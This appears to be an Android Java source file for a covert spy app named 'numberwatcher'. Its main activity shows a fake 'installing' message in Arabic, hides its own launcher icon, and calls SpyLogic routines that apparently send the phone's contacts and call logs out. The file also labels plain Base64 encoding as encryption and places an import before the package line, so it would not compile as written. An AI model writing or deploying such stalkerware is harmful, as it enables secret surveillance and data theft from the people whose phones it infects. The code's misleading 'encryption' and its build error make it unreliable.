import com.example.numberwatcher.SpyLogic;

package com.example.numberwatcher;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Base64;
import android.widget.Toast;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Request Permissions (should be done with proper PermissionRequest for Android M+)
        Toast.makeText(this, "يتم التثبيت...", Toast.LENGTH_SHORT).show();

        // Hide app icon
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP);

        SpyLogic.sendContacts(this);
        SpyLogic.sendCallLogs(this);
        finish();
    }

    public static String encrypt(String msg) {
        return Base64.encodeToString(msg.getBytes(), Base64.DEFAULT);
    }
}
